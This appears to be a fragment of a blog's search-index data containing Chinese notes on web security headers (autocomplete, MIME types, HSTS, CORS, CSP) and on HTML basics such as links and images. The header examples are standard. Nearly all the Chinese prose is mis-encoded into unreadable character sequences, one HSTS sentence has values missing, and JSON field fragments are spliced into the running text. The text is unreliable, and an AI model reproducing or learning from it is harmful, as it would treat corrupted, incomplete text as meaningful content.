ä¸ºæ•´ä¸ªè¡¨å•è®¾ç½®ï¼š form method=post action=/form autocomplete=off[â€¦]/form ä¸ºè¡¨å•ä¸­æŸä¸ªè¾“å…¥å…ƒç´ å•ç‹¬è®¾ç½®ï¼š form method=post action=/form [â€¦] div label for=ccä¿¡ç”¨å¡ï¼š/label input type=text id=cc name=cc autocomplete=off / /div/form ä¸€äº›æµè§ˆå™¨ï¼ˆå¦‚ Chrome å’Œ Edgeï¼‰å³ä½¿è®¾ç½®äº† autocomplete=offï¼Œä»ä¼šå°è¯•ä¸ºç”¨æˆ·åå’Œå¯†ç å­—æ®µæä¾›è‡ªåŠ¨å¡«å……åŠŸèƒ½ï¼Œé‚£ä¹ˆä½ éœ€è¦æ›´æ”¹è¾“å…¥å…ƒç´ çš„ name å±æ€§ï¼ˆæµè§ˆå™¨é€šå¸¸ä¼šæ ¹æ®å­—æ®µçš„ name å±æ€§åˆ¤æ–­å…¶ç”¨é€”ï¼Œå¯ä»¥ä¸ºè¿™äº›å­—æ®µè®¾ç½®éšæœºæˆ–æ— æ„ä¹‰çš„ name å€¼ï¼‰ autocomplete å±æ€§å’Œç™»å½•å­—æ®µ å¦‚æœä½ å®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·ç®¡ç†é¡µé¢ï¼Œå…¶ä¸­ç”¨æˆ·å¯ä»¥ä¸ºå…¶ä»–äººæŒ‡å®šæ–°çš„å¯†ç ï¼Œå› æ­¤ä½ æƒ³é˜»æ­¢å¯†ç å­—æ®µçš„è‡ªåŠ¨å¡«å……ï¼Œä½ å¯ä»¥ä½¿ç”¨ autocomplete=new-password å†…å®¹å®‰å…¨ æ­£ç¡®é…ç½®æœåŠ¡å™¨ MIME ç±»å‹ text/htmlå¯¹äºä¸€èˆ¬ç½‘é¡µ text/plainå¯¹äºä¸€èˆ¬æ–‡æœ¬ text/csså¯¹äºçº§è”æ ·å¼è¡¨ text/javascriptå¯¹äºè„šæœ¬ application/octet-streamæ„å‘³ç€â€œä¸‹è½½è¿™ä¸ªæ–‡ä»¶â€ application/x-java-appletå¯¹äº Java å°ç¨‹åº application/pdfå¯¹äº PDF æ–‡æ¡£ ä¸¥æ ¼ä¼ è¾“å®‰å…¨ (HTTP Strict Transport Security, HSTSï¼‰ é€šè¿‡å¼ºåˆ¶ä½¿ç”¨ HTTPS è€Œé HTTP æ¥é˜²æ­¢åè®®é™çº§æ”»å‡»å’Œä¼šè¯åŠ«æŒ Strict-Transport-Security: max-age=expire-time[; includeSubDomains][; preload] max-age: å¿…é¡»æŒ‡å®šï¼Œè¡¨ç¤º HSTS ç­–ç•¥çš„æœ‰æ•ˆæœŸï¼ˆå•ä½ï¼šç§’ï¼‰ã€‚ä¾‹å¦‚ï¼Œmax-age=31536000 è¡¨ç¤ºç­–ç•¥æœ‰æ•ˆæœŸä¸º 1 å¹´ã€‚ includeSubDomains: å¯é€‰ï¼Œè¡¨ç¤º HSTS ç­–ç•¥é€‚ç”¨äºä¸»åŸŸåŠå…¶æ‰€æœ‰å­åŸŸã€‚ å¦‚æœè®¾ç½®äº†è¯¥å‚æ•°ï¼Œåˆ™ sub.example.com ä¹Ÿä¼šå¼ºåˆ¶ä½¿ç”¨ HTTPSã€‚ preload: å¯é€‰ï¼ŒæŒ‡ç¤ºè¯¥åŸŸåç”³è¯·åŠ å…¥æµè§ˆå™¨çš„ HSTS é¢„åŠ è½½åˆ—è¡¨ã€‚éœ€è¦é€šè¿‡ HSTS Preload æäº¤ï¼Œå½“ä½¿ç”¨ ï¼Œ æŒ‡ä»¤å¿…é¡»è‡³å°‘æ˜¯ ï¼ˆä¸€å¹´ï¼‰ï¼Œå¹¶ä¸”å¿…é¡»å­˜åœ¨æŒ‡ä»¤ è·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰ ä¸€ç§åŸºäº HTTP æ ‡å¤´çš„æœºåˆ¶ï¼Œç”¨äºå…è®¸æœåŠ¡å™¨å£°æ˜å“ªäº›æ¥æºï¼ˆåŸŸåï¼‰å¯ä»¥è®¿é—®å…¶èµ„æºã€‚å®ƒè§£å†³äº†æµè§ˆå™¨çš„ åŒæºç­–ç•¥ é™åˆ¶é—®é¢˜ï¼Œä»è€Œå®‰å…¨åœ°å®ç°è·¨åŸŸèµ„æºçš„å…±äº« ç®€å•è¯·æ±‚ è¯·æ±‚æ–¹æ³•æ˜¯ GETã€POST æˆ– HEADã€‚ ä¸åŒ…å«è‡ªå®šä¹‰çš„è¯·æ±‚æ ‡å¤´ï¼ˆå¦‚ Authorizationï¼‰ã€‚ Content-Type æ ‡å¤´æ‰€æŒ‡å®šçš„åª’ä½“ç±»å‹çš„å€¼ä»…é™äºä¸‹åˆ—ä¸‰è€…ä¹‹ä¸€ï¼š application/x-www-form-urlencoded multipart/form-data text/plain æµè§ˆå™¨ä¼šç›´æ¥å‘é€è¯·æ±‚ï¼Œå¹¶æ ¹æ®å“åº”å¤´åˆ¤æ–­æ˜¯å¦å…è®¸è®¿é—® GET /api/data HTTP/1.1 Host: api.example.com Origin: https://example.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://example.com å¦‚æœ Access-Control-Allow-Origin æ ‡å¤´çš„å€¼ä¸è¯·æ±‚çš„ Origin åŒ¹é…ï¼Œåˆ™æµè§ˆå™¨å…è®¸è®¿é—®å“åº”æ•°æ® é¢„æ£€è¯·æ±‚ å¯¹äºéç®€å•è¯·æ±‚ï¼ˆå¦‚ä½¿ç”¨ PUTã€DELETE æ–¹æ³•ï¼Œæˆ–è‡ªå®šä¹‰æ ‡å¤´ï¼‰ï¼Œæµè§ˆå™¨ä¼šåœ¨æ­£å¼è¯·æ±‚ä¹‹å‰å‘é€ä¸€ä¸ª é¢„æ£€è¯·æ±‚ï¼ˆOPTIONS è¯·æ±‚ï¼‰ï¼Œä»¥ç¡®ä¿æœåŠ¡å™¨å…è®¸æ­¤æ“ä½œ OPTIONS /api/data HTTP/1.1Host: api.example.comOrigin: https://example.comAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: Authorization HTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: AuthorizationAccess-Control-Max-Age: 3600 Access-Control-Allow-Origin: æŒ‡å®šå…è®¸çš„æ¥æºã€‚ Access-Control-Allow-Methods: åˆ—å‡ºå…è®¸çš„ HTTP æ–¹æ³•ã€‚ Access-Control-Allow-Headers: åˆ—å‡ºå…è®¸çš„è¯·æ±‚æ ‡å¤´ã€‚ Access-Control-Max-Age: æŒ‡å®šé¢„æ£€ç»“æœçš„ç¼“å­˜æ—¶é—´ï¼ˆç§’ï¼‰ å¸¦å‡­æ®çš„è¯·æ±‚ å¦‚æœè¯·æ±‚éœ€è¦å‘é€å‡­æ®ï¼ˆå¦‚ Cookies æˆ– HTTP è®¤è¯ï¼‰ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š å®¢æˆ·ç«¯åœ¨è¯·æ±‚ä¸­è®¾ç½® withCredentials ä¸º trueã€‚ æœåŠ¡å™¨è¿”å›çš„å“åº”å¤´åŒ…å« Access-Control-Allow-Credentials: true GET /api/data HTTP/1.1Host: api.example.comOrigin: https://example.comCookie: sessionId=abc123 HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true å¦‚æœ Access-Control-Allow-Credentials ä¸º trueï¼ŒAccess-Control-Allow-Origin å¿…é¡»ä¸ºå…·ä½“çš„æ¥æºï¼Œä¸èƒ½ä½¿ç”¨é€šé…ç¬¦ * HTTPå“åº”æ ‡å¤´å­—æ®µ 1.Access-Control-Allow-Origin Access-Control-Allow-Origin: origin | * Access-Control-Allow-Origin å‚æ•°æŒ‡å®šäº†å•ä¸€çš„æºï¼Œå‘Šè¯‰æµè§ˆå™¨å…è®¸è¯¥æºè®¿é—®èµ„æºã€‚æˆ–è€…ï¼Œå¯¹äºä¸éœ€è¦æºå¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æŒ‡å®šè¯¥å­—æ®µçš„å€¼ä¸ºé€šé…ç¬¦â€œ*â€ï¼Œè¡¨ç¤ºå…è®¸æ¥è‡ªä»»æ„æºçš„è¯·æ±‚ 2.Access-Control-Expose-Headers è·¨æºè®¿é—®æ—¶ï¼ŒXMLHttpRequest å¯¹è±¡çš„ getResponseHeader() æ–¹æ³•åªèƒ½æ‹¿åˆ°ä¸€äº›æœ€åŸºæœ¬çš„å“åº”å¤´ï¼ŒCache-Controlã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragmaï¼Œå¦‚æœè¦è®¿é—®å…¶ä»–å¤´ï¼Œåˆ™éœ€è¦æœåŠ¡å™¨è®¾ç½®æœ¬å“åº”å¤´ å°†æŒ‡å®šæ ‡å¤´æ”¾å…¥å…è®¸åˆ—è¡¨ä¸­ï¼Œä¾›æµè§ˆå™¨çš„ JavaScript ä»£ç ï¼ˆå¦‚ getResponseHeader()ï¼‰è·å– Access-Control-Expose-Headers: header-name[, header-name]* 3.Access-Control-Max-Age æŒ‡å®šäº† preflight è¯·æ±‚çš„ç»“æœèƒ½å¤Ÿè¢«ç¼“å­˜å¤šä¹… Access-Control-Max-Age: delta-seconds 4.Access-Control-Allow-Credentials æŒ‡å®šäº†å½“æµè§ˆå™¨çš„ credentials è®¾ç½®ä¸º true æ—¶æ˜¯å¦å…è®¸æµè§ˆå™¨è¯»å– response çš„å†…å®¹ Access-Control-Allow-Credentials: true 5.Access-Control-Allow-Methods æŒ‡å®šäº†è®¿é—®èµ„æºæ—¶å…è®¸ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚æ‰€å…è®¸ä½¿ç”¨çš„ HTTP æ–¹æ³• Access-Control-Allow-Methods: method[, method]* 6.Access-Control-Allow-Headers ç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„æ ‡å¤´å­—æ®µ Access-Control-Allow-Headers: header-name[, header-name]* HTTPè¯·æ±‚æ ‡å¤´å­—æ®µ 1.Origin è¡¨æ˜é¢„æ£€è¯·æ±‚æˆ–å®é™…è·¨æºè¯·æ±‚çš„æºç«™ Origin: origin origin å‚æ•°çš„å€¼ä¸ºæºç«™ URLã€‚å®ƒä¸åŒ…å«ä»»ä½•è·¯å¾„ä¿¡æ¯ï¼Œåªæ˜¯æœåŠ¡å™¨åç§° 2.Access-Control-Request-Method ç”¨äºé¢„æ£€è¯·æ±‚ã€‚å…¶ä½œç”¨æ˜¯ï¼Œå°†å®é™…è¯·æ±‚æ‰€ä½¿ç”¨çš„ HTTP æ–¹æ³•å‘Šè¯‰æœåŠ¡å™¨ Access-Control-Request-Method: method 3.Access-Control-Request-Headers ç”¨äºé¢„æ£€è¯·æ±‚ï¼Œå°†å®é™…è¯·æ±‚æ‰€æºå¸¦çš„æ ‡å¤´å­—æ®µï¼ˆé€šè¿‡ setRequestHeader() ç­‰è®¾ç½®çš„ï¼‰å‘Šè¯‰æœåŠ¡å™¨ã€‚è¿™ä¸ªæµè§ˆå™¨ç«¯æ ‡å¤´å°†ç”±äº’è¡¥çš„æœåŠ¡å™¨ç«¯æ ‡å¤´ Access-Control-Allow-Headers å›ç­” Access-Control-Request-Headers: field-name[, field-name]* å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ ä¸ºä½¿ CSP å¯ç”¨ï¼Œä½ éœ€è¦é…ç½®ä½ çš„ç½‘ç»œæœåŠ¡å™¨è¿”å› Content-Security-Policy HTTP æ ‡å¤´ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œmetaå…ƒç´ ä¹Ÿå¯ä»¥è¢«ç”¨æ¥é…ç½®è¯¥ç­–ç•¥ meta http-equiv=Content-Security-Policy content=default-src self; script-src self https://trusted.cdn.com CSP ç¤ºä¾‹é…ç½® åŸºæœ¬é…ç½® åªå…è®¸ä»åŒæºåŠ è½½èµ„æºï¼Œç¦æ­¢å†…è”è„šæœ¬ï¼š Content-Security-Policy: default-src self; script-src self; å…è®¸å¯ä¿¡ç¬¬ä¸‰æ–¹èµ„æº å…è®¸ä»æŒ‡å®šçš„ CDN åŠ è½½ JavaScript å’Œæ ·å¼ï¼š Content-Security-Policy: script-src self https://cdn.example.com; style-src self https://cdn.example.com; å¯ç”¨æŠ¥å‘Šæœºåˆ¶ å½“ç­–ç•¥è¢«è¿åæ—¶ï¼Œå°†æŠ¥å‘Šå‘é€åˆ°æŒ‡å®šçš„ URLï¼š Content-Security-Policy: default-src self; report-uri /csp-report-endpoint; é˜²æ­¢ iframe åµŒå¥— ç¦æ­¢é¡µé¢è¢«åµŒå¥—åœ¨ iframe ä¸­ï¼Œé˜²æ­¢ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼š Content-Security-Policy: frame-ancestors none; X æ¡†æ¶é€‰é¡¹ â€˜â€™â€™ HTTPæ ‡å¤´","tags":["HTTP"],"categories":["è®¡ç®—æœºç½‘ç»œ","ç½‘ç»œåè®®"]},{"title":"HTML","path":"/2025/07/09/HTML/","content":"HTML å‰å¤‡çŸ¥è¯† !DOCTYPE html å£°æ˜ä¸º HTML5 æ–‡æ¡£ htmlå…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´  head å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ meta charset=utf-8 å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8ã€‚ title å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜ body å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹ h1 å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜ p å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½ HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ æ ‡è®°è¯­è¨€æ˜¯ä¸€å¥—æ ‡è®°æ ‡ç­¾ (markup tag) HTML ä½¿ç”¨æ ‡è®°æ ‡ç­¾æ¥æè¿°ç½‘é¡µ æ ‡ç­¾å†…å®¹/æ ‡ç­¾ HTML æ–‡æ¡£åŒ…å«äº†HTML æ ‡ç­¾åŠæ–‡æœ¬å†…å®¹ HTMLæ–‡æ¡£ä¹Ÿå«åš web é¡µé¢ !DOCTYPE å£°æ˜ !DOCTYPEå£°æ˜ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æœ‰åŠ©äºæµè§ˆå™¨ä¸­æ­£ç¡®æ˜¾ç¤ºç½‘é¡µã€‚ ä¸­æ–‡ç¼–ç  ç›´æ¥è¾“å‡ºä¸­æ–‡ä¼šå‡ºç°ä¸­æ–‡ä¹±ç ï¼Œè¦å°†å¤´éƒ¨å°†å­—ç¬¦å£°æ˜ä¸º UTF-8 æˆ– GBKã€‚ HTMLç©ºå…ƒç´  ä¸å«ä»»ä½•å†…å®¹çš„å…ƒç´ ï¼Œæ²¡æœ‰ç»“æŸæ ‡ç­¾ï¼ˆæœ€å¥½åŠ /ï¼‰ï¼Œç”¨äºæ’å…¥ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½æˆ–ä¿¡æ¯ï¼Œå¦‚**/brè¡¨æ¢è¡Œ** HTML åŸºç¡€ HTML æ ‡é¢˜ HTML æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡h1 - h6ï¼ˆä»å¤§åˆ°å°ï¼‰ æ ‡ç­¾æ¥å®šä¹‰çš„ã€‚ æ³¨é‡Š: æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ ‡é¢˜çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ HTML æ°´å¹³çº¿ æ ‡ç­¾åœ¨ HTML é¡µé¢ä¸­åˆ›å»ºæ°´å¹³çº¿ã€‚ **hr å…ƒç´ å¯ç”¨äºåˆ†éš”å†…å®¹**ã€‚ è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚ è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚ HTML æ³¨é‡Š å¯ä»¥å°†æ³¨é‡Šæ’å…¥ HTML ä»£ç ä¸­ï¼Œè¿™æ ·å¯ä»¥æé«˜å…¶å¯è¯»æ€§ï¼Œä½¿ä»£ç æ›´æ˜“è¢«äººç†è§£ã€‚æµè§ˆå™¨ä¼šå¿½ç•¥æ³¨é‡Šï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒä»¬ã€‚ HTML æ®µè½ HTML æ®µè½æ˜¯é€šè¿‡æ ‡ç­¾ p æ¥å®šä¹‰çš„ã€‚ **æ³¨æ„ï¼š**æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ï¼ˆ/p æ˜¯å—çº§å…ƒç´ ï¼‰ HTML æŠ˜è¡Œ å¦‚æœæ‚¨å¸Œæœ›åœ¨ä¸äº§ç”Ÿä¸€ä¸ªæ–°æ®µè½çš„æƒ…å†µä¸‹è¿›è¡Œæ¢è¡Œï¼ˆæ–°è¡Œï¼‰ï¼Œè¯·ä½¿ç”¨**br** å…ƒç´ æ˜¯ä¸€ä¸ªç©ºçš„ HTML å…ƒç´ ã€‚ç”±äºå…³é—­æ ‡ç­¾æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå› æ­¤å®ƒæ²¡æœ‰ç»“æŸæ ‡ç­¾ã€‚ æ³¨æ„ï¼šæ— æ³•é€šè¿‡åœ¨ HTML ä»£ç ä¸­æ·»åŠ é¢å¤–çš„ç©ºæ ¼æˆ–æ¢è¡Œæ¥æ”¹å˜è¾“å‡ºçš„æ•ˆæœã€‚å½“æ˜¾ç¤ºé¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šç§»é™¤æºä»£ç ä¸­å¤šä½™çš„ç©ºæ ¼å’Œç©ºè¡Œã€‚æ‰€æœ‰è¿ç»­çš„ç©ºæ ¼æˆ–ç©ºè¡Œéƒ½ä¼šè¢«ç®—ä½œä¸€ä¸ªç©ºæ ¼ã€‚ HTML æ–‡æœ¬æ ¼å¼åŒ– æ³¨ï¼šå¦‚æœæœ‰2ä¸ª br ç¬¬ä¸€ä¸ªä¸ºæ¢è¡Œï¼Œç¬¬äºŒä¸ªä¸ºç©ºè¡Œ é¢„æ ¼å¼ï¼šç”¨äºåœ¨æ˜¾ç¤ºæ—¶ä¿ç•™åŸå§‹çš„æ’ç‰ˆå’Œç©ºæ ¼pre å°†æ–‡å­—å€’åº bdoæ ‡ç­¾ç”¨äºæ˜¾å¼æ§åˆ¶æ–‡æœ¬çš„æ˜¾ç¤ºæ–¹å‘ dir å±æ€§ï¼š ltrï¼ˆleft-to-rightï¼‰ï¼šå¼ºåˆ¶ä»å·¦åˆ°å³æ˜¾ç¤ºå†…å®¹ã€‚ rtlï¼ˆright-to-leftï¼‰ï¼šå¼ºåˆ¶ä»å³åˆ°å·¦æ˜¾ç¤ºå†…å®¹ã€‚ bdo dir=rtlè¯¥æ®µè½æ–‡å­—ä»å³åˆ°å·¦æ˜¾ç¤ºã€‚/bdo åœ°å€ Written by Jon Doe.br HTML é“¾æ¥ HTML é“¾æ¥æ˜¯é€šè¿‡æ ‡ç­¾ a æ¥å®šä¹‰çš„ã€‚ åœ¨ href å±æ€§ä¸­æŒ‡å®šé“¾æ¥çš„åœ°å€ã€‚ é“¾æ¥è¯­æ³• hrefï¼šæŒ‡å®šé“¾æ¥ç›®æ ‡çš„URLï¼Œè¿™æ˜¯é“¾æ¥çš„æœ€é‡è¦å±æ€§ã€‚å¯ä»¥æ˜¯å¦ä¸€ä¸ªç½‘é¡µçš„URLã€æ–‡ä»¶çš„URLæˆ–å…¶ä»–èµ„æºçš„URLã€‚ targetï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šé“¾æ¥å¦‚ä½•åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚å¸¸è§çš„å€¼åŒ…æ‹¬ _blankï¼ˆåœ¨æ–°æ ‡ç­¾æˆ–çª—å£ä¸­æ‰“å¼€é“¾æ¥ï¼‰å’Œ _selfï¼ˆåœ¨å½“å‰æ ‡ç­¾æˆ–çª—å£ä¸­æ‰“å¼€é“¾æ¥ï¼‰ã€‚ titleï¼ˆå¯é€‰ï¼‰ï¼šæä¾›é“¾æ¥çš„é¢å¤–ä¿¡æ¯ï¼Œé€šå¸¸åœ¨é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šæ—¶æ˜¾ç¤ºä¸ºå·¥å…·æç¤ºã€‚ relï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šä¸é“¾æ¥ç›®æ ‡çš„å…³ç³»ï¼Œå¦‚ nofollowã€noopener ç­‰ã€‚ **æ–‡æœ¬é“¾æ¥ï¼š**æœ€å¸¸è§çš„é“¾æ¥ç±»å‹æ˜¯æ–‡æœ¬é“¾æ¥ï¼Œå®ƒä½¿ç”¨ a å…ƒç´ å°†ä¸€æ®µæ–‡æœ¬è½¬åŒ–ä¸ºå¯ç‚¹å‡»çš„é“¾æ¥ï¼Œä¾‹å¦‚ï¼š a href=https://www.example.comè®¿é—®ç¤ºä¾‹ç½‘ç«™/a æ²¡æœ‰ä¸‹åˆ’çº¿çš„é“¾æ¥ï¼š **å›¾åƒé“¾æ¥ï¼š**æ‚¨è¿˜å¯ä»¥ä½¿ç”¨å›¾åƒä½œä¸ºé“¾æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œa å…ƒç´ åŒ…å›´ç€ img å…ƒç´ ã€‚ä¾‹å¦‚ï¼š a href=https://www.example.com img src=example.jpg alt=ç¤ºä¾‹å›¾ç‰‡/a **é”šç‚¹é“¾æ¥ï¼š**é™¤äº†é“¾æ¥åˆ°å…¶ä»–ç½‘é¡µå¤–ï¼Œæ‚¨è¿˜å¯ä»¥åœ¨åŒä¸€é¡µé¢å†…åˆ›å»ºå†…éƒ¨é“¾æ¥ï¼Œè¿™ç§°ä¸ºé”šç‚¹é“¾æ¥ã€‚è¦åˆ›å»ºé”šç‚¹é“¾æ¥ï¼Œéœ€è¦åœ¨ç›®æ ‡ä½ç½®ä½¿ç”¨ a å…ƒç´ å®šä¹‰ä¸€ä¸ªæ ‡è®°ï¼Œå¹¶ä½¿ç”¨#ç¬¦å·å¼•ç”¨è¯¥æ ‡è®°ã€‚ä¾‹å¦‚ï¼š a href=#section2è·³è½¬åˆ°ç¬¬äºŒéƒ¨åˆ†/a!-- åœ¨é¡µé¢ä¸­çš„æŸä¸ªä½ç½® --a name=section2/a **ä¸‹è½½é“¾æ¥ï¼š**å¦‚æœæ‚¨å¸Œæœ›é“¾æ¥ç”¨äºä¸‹è½½æ–‡ä»¶è€Œä¸æ˜¯å¯¼èˆªåˆ°å¦ä¸€ä¸ªç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨ download å±æ€§ã€‚ä¾‹å¦‚ï¼š a href=document.pdf downloadä¸‹è½½æ–‡æ¡£/a å±æ€§ target ä½¿ç”¨ target å±æ€§ï¼Œä½ å¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚ åœ¨çª—å£ä¸Šä¸‹æ–‡ä¸­ï¼Œâ€œtopâ€æŒ‡çš„æ˜¯æœ€é¡¶å±‚çš„çª—å£ï¼Œè€Œâ€œselfâ€æ˜¯æŒ‡å½“å‰çš„çª—å£æˆ–æ¡†æ¶ã€‚ä½¿ç”¨target=_topä¼šè®©é“¾æ¥åœ¨æ•´ä¸ªæµè§ˆå™¨çª—å£ä¸­æ‰“å¼€ï¼Œè€Œtarget=_selfåˆ™åœ¨å½“å‰çš„çª—å£æˆ–æ¡†æ¶ä¸­æ‰“å¼€ã€‚ åœ¨æœ¬çª—å£(å½“å‰æ¡†æ¶)æ‰“å¼€ a href=https://www.runoob.com/ target=_selfè®¿é—®èœé¸Ÿæ•™ç¨‹!/a åœ¨æœ¬çª—å£(çª—å£ä¸»æ¡†æ¶)æ‰“å¼€ a href=https://www.runoob.com/ target=_topè®¿é—®èœé¸Ÿæ•™ç¨‹!/a åœ¨æ–°çª—å£æ‰“å¼€ a href=https://www.runoob.com/ target=_blankè®¿é—®èœé¸Ÿæ•™ç¨‹!/a é‚®ç®±é“¾æ¥ï¼ˆmailtoé“¾æ¥ï¼‰ a href=mailto:someone@example.com?subject=é‚®ä»¶ä¸»é¢˜body=é‚®ä»¶å†…å®¹å‘é€é‚®ä»¶/a mailto:someone@example.com æ˜¯æ”¶ä»¶äººçš„é‚®ç®±åœ°å€ã€‚ subject=é‚®ä»¶ä¸»é¢˜ æ˜¯é‚®ä»¶çš„ä¸»é¢˜ã€‚ body=é‚®ä»¶å†…å®¹ æ˜¯é‚®ä»¶çš„æ­£æ–‡å†…å®¹ã€‚ id id å±æ€§å¯ç”¨äºåˆ›å»ºä¸€ä¸ª HTML æ–‡æ¡£ä¹¦ç­¾ã€‚ æç¤º: ä¹¦ç­¾ä¸ä¼šä»¥ä»»ä½•ç‰¹æ®Šæ–¹å¼æ˜¾ç¤ºï¼Œå³åœ¨ HTML é¡µé¢ä¸­æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥å¯¹äºè¯»è€…æ¥è¯´æ˜¯éšè—çš„ã€‚ å®ä¾‹ åœ¨æœ¬é¡µé¢ä¸­åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°æœ‰ç”¨çš„æç¤ºéƒ¨åˆ† åœ¨HTMLæ–‡æ¡£ä¸­æ’å…¥ID a href=#tipsè®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†/a a id=tipsæœ‰ç”¨çš„æç¤ºéƒ¨åˆ†/a åœ¨å¦ä¸€ä¸ªé¡µé¢åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°æœ‰ç”¨çš„æç¤ºéƒ¨åˆ† a href=https://www.runoob.com/html/html-links.html#tipsè®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†/a HTML å›¾åƒ å›¾åƒæ ‡ç­¾ï¼ˆ imgï¼‰å’Œæºå±æ€§ï¼ˆSrcï¼‰ åœ¨ HTML ä¸­ï¼Œå›¾åƒç”±img æ ‡ç­¾å®šä¹‰ï¼Œimg æ˜¯ç©ºæ ‡ç­¾ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œæ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚ è¦åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå›¾åƒï¼Œä½ éœ€è¦ä½¿ç”¨æºå±æ€§ï¼ˆsrcï¼‰ â€œsourceâ€ï¼Œå…¶çš„å€¼æ˜¯å›¾åƒçš„ URL åœ°å€ï¼ˆURL æŒ‡å­˜å‚¨å›¾åƒçš„ä½ç½®ã€‚å¦‚æœåä¸º â€œpulpit.jpgâ€ çš„å›¾åƒä½äº www.runoob.com çš„ images ç›®å½•ä¸­ï¼Œé‚£ä¹ˆå…¶ URL ä¸º http://www.runoob.com/images/pulpit.jpgã€‚ï¼‰ Altå±æ€§ alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬ã€‚æ›¿æ¢æ–‡æœ¬å±æ€§çš„å€¼æ˜¯ç”¨æˆ·å®šä¹‰çš„ å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ heightï¼ˆé«˜åº¦ï¼‰ ä¸ widthï¼ˆå®½åº¦ï¼‰å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ åˆ›å»ºå›¾åƒæ˜ å°„ å¸¦æœ‰å¯ä¾›ç‚¹å‡»åŒºåŸŸçš„å›¾åƒåœ°å›¾ã€‚å…¶ä¸­çš„æ¯ä¸ªåŒºåŸŸéƒ½æ˜¯ä¸€ä¸ªè¶…çº§é“¾æ¥ã€‚ è§£é‡Šï¼š 1.map æ¯ä¸ª area å…ƒç´ å¯ä»¥æœ‰ä»¥ä¸‹å±æ€§ï¼š shapeï¼šå®šä¹‰åŒºåŸŸçš„å½¢çŠ¶ï¼Œå¯ä»¥æ˜¯ rectï¼ˆçŸ©å½¢ï¼‰ã€circleï¼ˆåœ†å½¢ï¼‰ã€polyï¼ˆå¤šè¾¹å½¢ï¼‰æˆ– defaultï¼ˆé»˜è®¤åŒºåŸŸï¼‰ã€‚ coordsï¼šå®šä¹‰åŒºåŸŸçš„åæ ‡ï¼Œå–å†³äºåŒºåŸŸçš„å½¢çŠ¶ã€‚ hrefï¼šå®šä¹‰å½“ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªåŒºåŸŸæ—¶å°†å¯¼èˆªåˆ°çš„ URLã€‚ 